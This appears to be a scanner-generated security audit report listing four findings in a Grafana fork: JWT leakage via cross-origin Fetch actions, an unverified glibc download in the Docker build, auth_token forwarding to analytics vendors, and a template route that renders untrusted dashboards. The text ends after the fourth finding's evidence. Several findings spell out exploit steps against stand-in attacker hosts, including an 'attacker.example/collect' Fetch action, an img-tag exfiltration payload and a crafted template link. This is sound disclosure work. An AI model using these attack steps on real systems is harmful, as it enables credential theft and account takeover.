**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256206

---

# backendSrv attaches URL-login JWT header to cross-origin requests; dashboard Fetch actions exfiltrate it to an Editor-chosen host

## Details
When JWT URL login is enabled ([auth.jwt] url_login = true with header_name set; the documented way to embed Grafana where request headers cannot be rewritten), the frontend reads the user's JWT from the `auth_token` query parameter (`loadUrlToken`, cached for the page lifetime) and `BackendSrv.internalFetch` adds it as a request header named `config.jwtHeaderName` to EVERY request it sends. Unlike `X-Grafana-Org-Id`, `X-Grafana-NoCache` and the `Authorization`->`X-DS-Authorization` rename, which `parseRequestOptions` applies only when `isLocalUrl(options.url)` is true, the JWT header is attached with no origin check, so it is sent to absolute `http(s)://` URLs on other origins as well. `X-Grafana-Device-Id` (a FingerprintJS visitor id) is attached unconditionally in the same block.

Shipped code lets dashboard content choose such a cross-origin destination: dashboard panel field 'Fetch' actions and canvas element actions (`public/app/features/actions/utils.ts`) call `getBackendSrv().fetch()` with a URL built from the Editor-authored action config; `getUrl` sanitises only relative URLs and passes absolute ones through. Actions are rendered only when `canExecuteActions()` -> `canEditDashboard()` is true, so the victim is a user who can edit the dashboard — by default any Editor in the org, or an (Org/Server) Admin — not a plain Viewer. Any other backendSrv caller with an absolute URL (datasources configured in browser/'direct' access mode, third-party frontend plugins) leaks the header to its target host the same way.

Attack: Editor A adds a Fetch action (GET, or a one-click canvas button action) pointing at `https://attacker.example/collect` to a dashboard. Editor B or an Admin who opened Grafana through a URL-login link (`/d/<uid>?kiosk&auth_token=<JWT>`, the docs' example) hovers/clicks the action and confirms (no confirmation when the Editor set oneClick). The browser issues a CORS request that the attacker's server permits; the actual request carries `<jwtHeaderName>: <JWT>` (plus X-Grafana-Action, X-Grafana-Device-Id). Cookies are not sent (`credentials: 'same-origin'`), but the JWT is the victim's full Grafana credential: the attacker replays it via the same header or `?auth_token=` and acts as the victim (including Admin) until the token expires.

The docs for `url_login` warn only about JWTs in server logs and non-TLS transport; forwarding the token to third-party origins chosen by dashboard content is not an intended behaviour, and the project's designed concession for actions (`actions_allow_post_url`: remote requests are allowed) covers the Editor-configured headers, not Grafana's own credential. Assumption: `config.jwtUrlLogin`/`config.jwtHeaderName` (defaults false/'' in @grafana/runtime config.ts, merged from window.grafanaBootData.settings) mirror `[auth.jwt] url_login`/`header_name`, as the backend_srv code and docs indicate; the Go backend is not in the checkout.

## Evidence
1. [public/app/core/services/backend\_srv.ts:254–280](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L254-L280)
   internalFetch() (lines 261-267) reads the JWT via loadUrlToken() and, when config.jwtUrlLogin && config.jwtHeaderName, sets options.headers[config.jwtHeaderName] = token for EVERY request, with no check that options.url targets the Grafana origin. X-Grafana-Device-Id (FingerprintJS visitorId, line 117) is attached unconditionally in the same block (269-272). This is the code the fix must change.
2. [public/app/core/services/backend\_srv.ts:294–326](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L294-L326)
   parseRequestOptions() applies isLocalUrl(options.url) before adding X-Grafana-Org-Id, X-Grafana-NoCache and before renaming Authorization to X-DS-Authorization — showing the project's own convention that Grafana-specific headers are same-origin only. The JWT block runs after this guard and is not covered by it.
3. [public/app/core/utils/urlToken.ts:1–13](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/urlToken.ts#L1-L13)
   loadUrlToken() caches the ?auth_token value in a module-level variable, so once the page was entered through a URL-login link every subsequent backendSrv request in that page lifetime carries the JWT, even after SPA navigation drops the parameter.
4. [public/app/features/actions/utils.ts:108–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/actions/utils.ts#L108-L133)
   ActionModel.onClick for a Fetch action builds the request with buildActionRequest and hands it to getBackendSrv().fetch(request) — the only in-tree place where dashboard-authored content chooses the absolute URL of a backendSrv request.
5. [public/app/features/actions/utils.ts:191–236](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/actions/utils.ts#L191-L236)
   buildActionRequest/processActionConfig use new URL(getUrl(replaceVariables(config.url))). getUrl() only sanitises URLs starting with '/'; an absolute https://attacker.example/... URL is passed through unchanged, so the Editor fully controls the destination origin. The only header the code adds itself is X-Grafana-Action: 1.
6. [public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts:205–207](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts#L205-L207)
   canExecuteActions() returns dashboard.canEditDashboard(). Every action-rendering site (table hooks, status-history/heatmap/xychart/barchart/trend tooltips, CanvasTooltip, canvas element one-click) consults it, so actions are only offered to users who can edit the dashboard. This fixes the victim position: not a Viewer, but another Editor (basic Editor role edits all org dashboards by default) or an Admin who entered Grafana via ?auth_token=.
7. [public/app/features/dashboard-scene/scene/DashboardScene.tsx:1226–1230](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/DashboardScene.tsx#L1226-L1230)
   canEditDashboard(): !isSnapshot && !isEmbedded && (canEdit || canMakeEditable || config.viewersCanEdit). isEmbedded is set only for the DashboardRoutes.Embedded route (DashboardScenePageStateManager.ts:896-898), not for the normal /d/<uid>?kiosk&auth_token= URL-login entry the docs show, so actions remain executable in the documented URL-login flow.
8. [public/app/core/utils/fetch.ts:194–208](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L194-L208)
   parseCredentials() defaults to 'same-origin', so the cross-origin request carries no cookies — the URL-login JWT header is the Grafana credential that reaches the third party. The custom headers make it a CORS-preflighted request, which the attacker's own server trivially permits (Access-Control-Allow-Origin/-Headers).
9. [public/app/core/utils/query.ts:42–44](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/query.ts#L42-L44)
   isLocalUrl() — the only same-origin discriminator backendSrv has — is not consulted for the JWT header. It is also case-sensitive (/^http/), so a URL like 'HTTP://host' would be treated as local even where it is used.

## Impact
The exfiltrated JWT is the victim's complete authentication credential for Grafana; the attacker (an Editor) can read everything the victim can and perform any action as the victim — an Editor-to-Admin escalation when the victim is an Admin — for the token's validity period. No availability impact.

## Reproduction steps
1. Network-delivered through normal dashboard use. Attacker is an Editor (PR:LOW) who stores a Fetch action with an attacker-controlled absolute URL in a dashboard. Attack requirements PRESENT: the deployment must run JWT URL login (the feature whose code path carries the header; docs' embedding scenario) and the victim must have entered via an auth_token URL and be able to edit the dashboard (default Editor role or Admin). The victim must click the action button (and confirm unless oneClick is set) — ACTIVE interaction. No security mechanism is defeated: the attacker's own server answers the CORS preflight permissively, and there is no origin check to bypass (AC:LOW).

## Recommended fix
1. internalFetch adds the URL-login JWT header (and X-Grafana-Device-Id) to every request regardless of destination origin; the same-origin discriminator (isLocalUrl) used for the other Grafana-specific headers is not applied to it. Fix criteria: The JWT header and X-Grafana-Device-Id are attached only to requests whose URL resolves to the Grafana origin (relative paths, or absolute URLs equal to window.location.origin + appSubUrl, with a case-insensitive scheme check). Verify by issuing backendSrv.fetch to an absolute third-party URL with auth_token present: the outgoing request contains neither header, while requests to /api/* still carry both.
2. Dashboard Fetch actions pass Editor-authored absolute URLs straight to backendSrv, so any header backendSrv adds for Grafana authentication is sent to arbitrary hosts chosen by dashboard content. Fix criteria: A Fetch action targeting a non-Grafana origin is sent with only the headers the Editor configured plus X-Grafana-Action, never any Grafana credential or identity header; a test with a cross-origin action URL and an active URL-login token confirms no such header leaves the Grafana origin.

---
**Severity:** HIGH
**Status:** Open
**Category:** Credential exposure
**CWE:** [CWE-522](https://cwe.mitre.org/data/definitions/522.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256205

---

# Alpine release image pipes unverified glibc loader/libc tarball from dl.grafana.com into / as root

## Details
The Dockerfile's `final-alpine` stage — the default target (line 404) and the image the release pipeline (packaging/docker/build.sh, `--target final-alpine --no-cache=true`) builds and push_to_docker_hub.sh publishes as grafana/grafana:<version> and :latest — installs a glibc compatibility layer by piping `curl -fsSL "https://dl.grafana.com/glibc/glibc-bin-$GLIBC_VERSION.tar.gz"` straight into `tar zxf - -C /` as root (lines 236-247). The extracted members are the dynamic loader `/usr/glibc-compat/lib/ld-linux-x86-64.so.2` (symlinked into `/lib64`) and `libc.so.6`, `libdl`, `libm`, `libpthread`, `librt`, `libresolv`.

Root cause (CWE-494): executable code is downloaded and installed without any integrity check. The URL is not content-addressed and no digest, checksum or signature committed in the repository is compared against the fetched bytes; the only protection is the TLS connection to dl.grafana.com at build time. This is the single unverified network artifact in the build: base images are pinned FROM lines, apk/apt packages are distribution-signed, Go modules are checked against go.sum, yarn runs --immutable against the lockfile, and the Grafana tarball itself comes from the build context. The project's other distribution channels are likewise integrity-checked — deb/rpm packages are GPG-signed (docs/sources/setup-grafana/installation/redhat-rhel-fedora/index.md:81) and plugins carry signatures that Grafana verifies 'to make sure plugins haven't been tampered with' (docs/sources/administration/plugin-management/plugin-install.md:112) — so the project does not treat transport from its own hosts as sufficient integrity; the glibc fetch acts around that control.

Scope of the executed code: the 13 bundled plugin backends in data/plugins-bundled are statically linked Go binaries and never touch this loader. The fetched loader and libc execute when a glibc-linked third-party backend plugin binary runs inside the container — plugins installed through GF_INSTALL_PLUGINS / preinstall (packaging/docker/run.sh:66-82, packaging/docker/custom/Dockerfile:16-32), which is exactly why the layer exists (packaging/docker/README.md v6.5.0-beta1: 'support certain backend plugins in alpine'). A substituted tarball therefore yields silent code execution as the grafana user in every deployment of the published Alpine image that runs such a plugin, with no checksum or signature failure anywhere in the chain to reveal the substitution.

## Evidence
1. [Dockerfile:234–247](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/Dockerfile#L234-L247)
   In the final-alpine stage the build runs `curl -fsSL "https://dl.grafana.com/glibc/glibc-bin-$GLIBC_VERSION.tar.gz" | tar zxf - -C /` as root, extracting ld-linux-x86-64.so.2, libc.so.6, libdl, libm, libpthread, librt and libresolv into /usr/glibc-compat/lib and symlinking the loader into /lib64. No digest, checksum or signature is checked and the URL is not content-addressed: whatever bytes the HTTPS response carries become the dynamic loader and libc shipped in the image. This is the code the fix must change.
2. [Dockerfile:402–404](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/Dockerfile#L402-L404)
   final-alpine is the default stage: a build without --target produces the Alpine image, i.e. the image published as grafana/grafana:<version>.
3. [packaging/docker/build.sh:60–81](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/packaging/docker/build.sh#L60-L81)
   The release pipeline builds the default (musl/alpine) variant with `--target final-alpine` and `--no-cache=true`, so the glibc fetch is re-executed on every official x64 release build rather than reused from a previously built layer.
4. [packaging/docker/push\_to\_docker\_hub.sh:36–57](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/packaging/docker/push_to_docker_hub.sh#L36-L57)
   The resulting image is pushed as grafana/grafana:<version> and grafana/grafana:latest and included in the multi-arch manifest, so a poisoned build reaches every user pulling the official Alpine image.
5. [Dockerfile:14–20](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/Dockerfile#L14-L20)
   Contrast: every other external input to the image is integrity-checked — base images are tag-pinned FROM lines delegated to Dependabot, apk/apt packages carry distribution signatures, Go modules are checked against go.sum (lines 77-86), yarn runs --immutable against the lockfile (lines 46-50), and the Grafana tarball comes from the build context (tgz-builder, line 120). The glibc bundle is the single unverified network artifact.
6. [packaging/docker/README.md:48–49](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/packaging/docker/README.md#L48-L49)
   The changelog states the glibc compat libraries exist to 'support certain backend plugins in alpine'. The 13 bundled plugin backends under data/plugins-bundled are statically linked Go ELF binaries (file(1): 'statically linked'), so the fetched loader and libc are not executed by a default image; they execute whenever a glibc-linked third-party backend plugin binary runs in the container, which is the documented purpose of the layer.
7. [packaging/docker/run.sh:66–82](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/packaging/docker/run.sh#L66-L82)
   The image entrypoint installs operator-listed plugins (GF_INSTALL_PLUGINS, and the preinstall mechanism it points to) into the container at startup; packaging/docker/custom/Dockerfile lines 16-32 do the same at build time. These are the sanctioned paths by which glibc-linked third-party backend plugins land in the Alpine image and are then loaded through /lib64/ld-linux-x86-64.so.2.

## Impact
When a glibc-linked backend plugin process starts in a container built from the poisoned image, the attacker's ld-linux-x86-64.so.2 and libc.so.6 run with the grafana user's privileges in the Grafana container: full read of datasource secrets, the session/SQLite DB and config (C:H), arbitrary modification of dashboards, alerting, plugins and served content (I:H), and the ability to crash or hold the service (A:H). Bundled plugins are static, so a default image with no third-party glibc plugin does not execute the code; the worst case rated here is the documented use of the layer.

## Reproduction steps
1. Attacker position: able to control the HTTPS response for https://dl.grafana.com/glibc/glibc-bin-2.40.tar.gz during an official release build — compromise or poisoning of the dl.grafana.com origin, CDN or cache for that path, or an on-path position with a certificate the builder accepts (mis-issued certificate). Delivery: build.sh runs the Dockerfile with --no-cache; curl|tar as root installs the attacker's loader/libc into / of the image; push_to_docker_hub.sh publishes it as :<version> and :latest. Every pull then ships the trojaned libc, which executes when a glibc-linked third-party backend plugin runs. AC:H for defeating TLS/infrastructure; AT:P for the build-time window and the glibc-linked plugin.

## Recommended fix
The image build executes `curl | tar` as root on an unpinned, unverified network artifact that becomes the process loader and libc shipped in the published default image, so the integrity of every Alpine image depends solely on the transport to dl.grafana.com at build time while every other build input is digest-, lockfile- or signature-checked. Fix criteria: The build must refuse to produce an image unless the fetched glibc bundle matches a digest or signature committed in the repository (or the bundle is supplied from the build context / a digest-pinned image like the other inputs), and the comparison must happen before anything is extracted into /. Verification: serving a tarball that differs by a single byte from the expected one causes `docker build --target final-alpine` on x86_64 to fail rather than produce an image.

---
**Severity:** HIGH
**Status:** Open
**Category:** Download of code without integrity check
**CWE:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
**Attack vector:** NETWORK
**Attack complexity:** HIGH
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256203

---

# Pageview analytics backends forward URL-login auth_token (full query string) to GA/GA4/PostHog

## Details
When `[auth.jwt] url_login` is enabled, a user authenticates by opening `https://grafana/<path>?auth_token=<JWT>` (docs: configure-authentication/jwt/index.md, 'URL login'). The frontend reads the token (`loadUrlToken`, core/utils/urlToken.ts) and attaches it as a header on every backendSrv request, but never removes it from the address bar; `handleRedirectTo` explicitly returns early for token-bearing URLs without rewriting them. `GrafanaRoute` calls `reportPageview()` on mount and on every pathname/search/hash change; the runtime's `reportPageview` (recovered from the shipped source map `public/build/6540.a30454ce5fbe65a84f5f.js.map`) builds `page = appSubUrl + pathname + search + hash` and emits a Pageview Echo event. The analytics backends in `public/app/core/services/echo/backends/analytics/` forward that string off-origin to third parties:

- `GABackend.addEvent` (lines 34-35): `ga('set', { page })` + `ga('send','pageview')` -> www.google-analytics.com, registered when `[analytics] google_analytics_ua_id` is set.
- `PostHogBackend.addEvent` (line 87): `posthog.capture('$pageview', { path: page })` -> the configured PostHog host (default us.i.posthog.com), registered when `posthog_token` is set.
- `GA4Backend.addEvent` (line 50): `gtag('event','page_view',{ page_path: page })` -> Google Analytics 4, when `google_analytics_4_id` and `google_analytics_4_send_manual_page_views` are set.

Result: the bearer JWT used for URL login is recorded in the Google / PostHog analytics property and is readable by anyone with access to it (vendor, anyone the operator granted access, or whoever compromises that account) for as long as the token is valid; replaying it as the configured JWT header (backend_srv.ts:261-267) acts as the victim. The project itself treats the token as a secret: `ShareModal/utils.ts:54-56` strips `auth_token` from generated share links ('Token is unique to the authenticated identity and should not be shared'), and the url_login docs warn only about server logs / non-TLS exposure, not about analytics export.

Not established from this tree: the Rudderstack (`page()`), Application Insights (`trackPageView()`) and GA4 `gtag('config')` paths pass no URL argument; whether those SDKs collect document.location by default is dependency behaviour and is not relied on here. Echo's `meta.url` (Echo.ts:139-142) is not forwarded by these backends (PostHog's MetaAnalytics/GJA branches pass `e.payload`, not `e.meta`).

This is a sibling of the verified `url-login-auth-token-leaks-to-telemetry-page-url` (Faro `page.url`) and `crash-detector-exports-url-login-token-and-identity-to-faro`: same root cause (token left in the URL) but different, uncovered sinks. Preconditions: url_login enabled (default false) and one of the GA/GA4-manual/PostHog analytics backends configured — both supported, documented configurations, not disabled controls.

## Evidence
1. [public/app/core/services/echo/backends/analytics/GABackend.ts:29–42](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/echo/backends/analytics/GABackend.ts#L29-L42)
   On every Pageview event the backend calls ga('set', { page: e.payload.page }) then ga('send','pageview'). e.payload.page is built by @grafana/runtime reportPageview as `${appSubUrl}${location.pathname}${location.search}${location.hash}` (recovered from the shipped source map public/build/6540.a30454ce5fbe65a84f5f.js.map, packages/grafana-runtime/src/analytics/utils.ts), so a URL carrying ?auth_token=<JWT> is sent verbatim to www.google-analytics.com whenever [analytics] google_analytics_ua_id is set (init.ts:122-133).
2. [public/app/core/services/echo/backends/analytics/PostHogBackend.ts:86–89](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/echo/backends/analytics/PostHogBackend.ts#L86-L89)
   posthog.capture('$pageview', { path: e.payload.page }) sends the same pathname+search+hash string (auth_token included) to the configured PostHog host (default https://us.i.posthog.com) whenever [analytics] posthog_token is set (init.ts:191-204).
3. [public/app/core/services/echo/backends/analytics/GA4Backend.ts:44–52](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/echo/backends/analytics/GA4Backend.ts#L44-L52)
   When google_analytics_4_send_manual_page_views is enabled, gtag('event','page_view',{ page_path: e.payload.page }) forwards the full path+query (auth_token included) to Google Analytics 4. (The constructor's gtag('config') at lines 32-41 passes only window.location.pathname; whether the gtag.js SDK additionally reports document.location by default is SDK behaviour, not shown in this tree.)
4. [public/app/core/utils/urlToken.ts:3–13](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/urlToken.ts#L3-L13)
   loadUrlToken reads auth_token from window.location.search, caches it, and never removes it from the URL, so the JWT remains in location.search for the lifetime of the page and every pageview report.
5. [public/app/core/navigation/handleRedirectTo.ts:8–15](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/navigation/handleRedirectTo.ts#L8-L15)
   On boot, when auth_token is present the handler returns early without rewriting the URL (it strips redirectTo via history.replaceState at line 21 only in the non-token branch), so the token is deliberately left in the address bar.
6. [public/app/core/navigation/GrafanaRoute.tsx:39–45](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/navigation/GrafanaRoute.tsx#L39-L45)
   reportPageview() fires on every route render and whenever pathname/search/hash change, so the token-bearing URL is reported immediately on landing and again on each in-app navigation while the query string persists.
7. [public/app/features/dashboard/components/ShareModal/utils.ts:54–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/components/ShareModal/utils.ts#L54-L56)
   The project's own share-link builder strips auth_token with the comment 'Token is unique to the authenticated identity and should not be shared' — the project treats the token as a secret, yet the analytics pageview path applies no equivalent stripping.

## Impact
The exported value is the user's complete bearer credential; replaying it in the configured JWT header grants the victim's full read access to Grafana for the token's lifetime (VC:H). Writes are possible to the extent of the victim's role, but the documented URL-login use case is embedded/kiosk dashboard viewing and the JWT is time-bounded, so integrity is rated LOW, consistent with the verified Faro sibling. No availability impact.

## Reproduction steps
1. Deployment conditions (AT:P): url_login enabled and a GA/GA4 (manual page views)/PostHog analytics backend configured — supported, documented features, not shipped controls switched off. Given those, the leak is automatic for every user who opens a URL-login link (UI:P: the victim merely uses the documented login flow). The recipient — whoever can read the analytics property — needs no Grafana privileges (PR:N) and bypasses no control; the pageview path applies no stripping, unlike the share-link builder. The recovered `reportPageview` source is an explicit assumption about the absent @grafana/runtime package at the pinned build.

## Recommended fix
1. Pageview reporting serialises the full location (pathname + search + hash) and the GA/GA4/PostHog backends forward it off-origin without redacting credential-bearing parameters. Fix criteria: Analytics/pageview payloads must never contain credentials: strip `auth_token` (and other secret-bearing parameters) from the reported page string before any backend sees it, or report pathname only. Verify by loading `/?auth_token=x` with GA/GA4-manual/PostHog configured and confirming the token appears in no outbound analytics request.
2. The frontend keeps the URL-login token in the address bar after reading it (urlToken.ts caches it but does not rewrite the URL; handleRedirectTo returns early for token URLs), so every later location-derived report repeats the leak. Fix criteria: After the token is consumed and cached, remove it from the URL (history.replaceState) so location.search no longer carries it; verify that window.location.href has no auth_token once the app has booted and that subsequent requests still carry the cached token.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Information Exposure
**CWE:** [CWE-201](https://cwe.mitre.org/data/definitions/201.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256413

---

# Template route renders attacker-chosen grafana.com dashboard live from a link, bypassing community safety filters

## Details
The dashboard-library 'template' route (`/dashboard/template`) loads a dashboard JSON from grafana.com selected purely by URL parameters and renders it as a live, edit-mode dashboard in the victim's session.

`DashboardScenePageStateManager.fetchDashboard` routes `DashboardRoutes.Template` unconditionally to `loadDashboardLibrary`, which reads `gnetId`, `mappings`, `datasource` and `pluginId` from `window.location.search`. With `gnetId` set it calls `loadCommunityTemplateDashboard`, which `JSON.parse`s `mappings`, issues `GET /api/gnet/dashboards/${gnetId}` (the backend's generic signed-in proxy to grafana.com, so any dashboard anyone has published there), runs `interpolateV1Dashboard(gnetDashboard.json, mappings)` and returns a DashboardDTO. `transformResponseToScene` then builds the scene with `transformSaveModelToScene`, calls `scene.onEnterEditMode()` and marks it dirty. Panels activate immediately: plugin code for every panel `type` in the JSON loads, panel and variable queries execute against the victim's datasources (a mapping entry `{"name":"*","type":"datasource","value":"default"}` is expanded over every `__inputs` datasource and resolved by `getInstanceSettings('default')` to the victim's default datasource), and text panels interpolate variables into their markdown before sanitization.

The maintainers treat grafana.com dashboards as untrusted: `dashboardLibraryApi.filterNonSafeDashboards` removes dashboards using panel plugins 'known to allow JavaScript code execution', and `communityDashboardHelpers.canDashboardContainJS` rejects dashboards whose panel JSON looks like code 'due to security reasons'. Both checks live only in the modal's click handler (`onUseCommunityDashboard`) that *constructs* the template URL via `navigateToTemplate`; the route itself performs neither check, so a crafted link reaches the live render with any grafana.com dashboard. The sanctioned alternative, `/dashboard/import?gcomDashboardId=`, only fetches the JSON into an ImportOverview form and requires the user to click Import before anything is created or rendered.

Attack: an unauthenticated attacker with a free grafana.com account publishes a dashboard and sends a Grafana user who has `dashboards:create` (any Editor) a link such as `https://victim/dashboard/template?gnetId=<id>&mappings=%5B%7B%22name%22%3A%22*%22%2C%22type%22%3A%22datasource%22%2C%22value%22%3A%22default%22%7D%5D`. On click the dashboard executes in the victim's origin with the victim's cookie. Plugin-independent consequence: query variables defined by the attacker run against the victim's default datasource and their values are exfiltrated zero-click through a text panel `<img src="https://attacker/?v=${queryVar}">` (img src survives the xss whitelist); plus every Editor->Viewer click-driven sink already on record (field actions, canvas buttons, data links). If any denylisted panel plugin (dynamic text, HTML graphics, ...) is installed, the JSON reaches a panel that renders attacker HTML/JS directly, which is exactly what the denylist exists to stop.

This turns 'follow a link' into 'run a dashboard authored by an anonymous third party with your privileges', collapsing the Editor->Viewer trust boundary to unauthenticated->Editor. The route is registered only when `dashboardTemplates` (public preview, not enabled by default per docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md), `suggestedDashboards` or `dashboardLibrary` (experimental) is enabled, so the finding holds only on instances with one of these toggles on.

## Evidence
1. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:772–799](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L772-L799)
   loadCommunityTemplateDashboard reads ?mappings= from the URL, JSON.parses it, fetches `/api/gnet/dashboards/${gnetId}` (the backend's signed-in proxy to grafana.com, any published dashboard id), runs interpolateV1Dashboard with the URL-supplied mappings and returns the result as a DashboardDTO. No panel-type denylist, JS heuristic or user confirmation is applied on this path; this is the code the fix must change.
2. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:702–770](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L702-L770)
   loadDashboardLibrary (reached unconditionally from fetchDashboard's `case DashboardRoutes.Template`) dispatches on URL params: gnetId+datasource+pluginId -> loadGrafanaDashboardTemplate (raw GET /api/gnet/dashboards/${gnetId} with a wildcard mapping to the URL-supplied datasource), gnetId alone -> loadCommunityTemplateDashboard. Both build the DTO via buildDashboardDTOFromInterpolated.
3. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:638–651](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L638-L651)
   transformResponseToScene turns the gnet JSON into a live DashboardScene via transformSaveModelToScene and, for the Template route, calls scene.onEnterEditMode() and sets isDirty=true: the attacker-authored dashboard renders immediately (panel plugins load, panel and variable queries run, text panels interpolate) without any save or confirmation step.
4. [public/app/routes/routes.tsx:96–105](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/routes/routes.tsx#L96-L105)
   The /dashboard/template route is registered when suggestedDashboards, dashboardLibrary or dashboardTemplates is enabled and is gated only on DashboardsCreate (Editors by default). DashboardPageProxy forwards straight to DashboardScenePage, which calls stateManager.loadDashboard with route=Template; nothing validates where the user came from.
5. [public/app/features/dashboard/dashgrid/DashboardLibrary/utils/communityDashboardHelpers.ts:245–261](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/dashgrid/DashboardLibrary/utils/communityDashboardHelpers.ts#L245-L261)
   The maintainers' own protection, canDashboardContainJS (rejects a community dashboard 'due to security reasons'), runs only inside onUseCommunityDashboard, the modal click handler that then calls navigateToTemplate to build the /dashboard/template URL. A direct link to the route skips it entirely; this is the only call site of the check.
6. [public/app/features/dashboard/dashgrid/DashboardLibrary/api/dashboardLibraryApi.ts:11–17](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/dashgrid/DashboardLibrary/api/dashboardLibraryApi.ts#L11-L17)
   UNSAFE_PANEL_TYPE_SLUGS lists panel plugins 'known to allow JavaScript code execution'; filterNonSafeDashboards (137-170) is applied only to the listing used by the modal, never to the dashboard fetched by the route.
7. [public/app/features/manage-dashboards/import/utils/inputs.ts:373–432](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/manage-dashboards/import/utils/inputs.ts#L373-L432)
   interpolateV1Dashboard accepts the URL-supplied mappings verbatim; a wildcard mapping `{name:'*',type:'datasource',value:'default'}` is expanded to every __inputs datasource and resolved with getDataSourceSrv().getInstanceSettings, so the attacker needs no knowledge of the victim's datasource names to bind all panel and variable queries to the victim's default datasource.
8. [public/app/features/plugins/datasource\_srv.ts:119–128](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/datasource_srv.ts#L119-L128)
   getInstanceSettings('default') returns the instance's default datasource, which is what makes the wildcard mapping work with no reconnaissance.
